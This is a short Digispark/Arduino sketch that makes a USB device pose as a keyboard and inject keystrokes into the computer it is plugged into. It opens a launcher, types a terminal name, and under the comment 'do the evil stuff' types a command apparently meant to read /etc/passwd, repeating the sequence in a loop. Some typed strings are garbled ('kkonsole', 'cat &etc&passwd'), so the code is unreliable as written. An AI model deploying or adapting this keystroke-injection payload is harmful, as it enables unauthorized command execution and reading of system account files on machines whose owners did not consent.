#include "DigiKeyboard.h"

void setup() {
  // don't need to set anything up to use DigiKeyboard
}


void loop() {
  // this is generally not necessary but with some older systems it seems to
  // prevent missing the first character after a delay:
  //DigiKeyboard.sendKeyStroke(0);
  
  // Type out this string letter by letter on the computer (assumes US-style
  // keyboard)
  //DigiKeyboard.println("Hello Digispark!");
  //digitalWrite(1, HIGH); //turn on led
  //DigiKeyboard.sendKeyStroke(KEY_F2 | MOD_ALT_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_F2 | KEY_SPACE);
  DigiKeyboard.delay(5000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.sendKeyStroke(0);

  //digitalWrite(1, LOW); // led off
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.println("kkonsole");
  //DigiKeyboard.sendKeyStroke(KEY_ENTER);


  // It's better to use DigiKeyboard.delay() over the regular Arduino delay()
  // if doing keyboard stuff because it keeps talking to the computer to make
  // sure the computer knows the keyboard is alive and connected
  DigiKeyboard.delay(5000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  // do the evil stuff
  DigiKeyboard.delay(5000);
  DigiKeyboard.println("cat &etc&passwd");
  DigiKeyboard.delay(5000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  //exit;
}
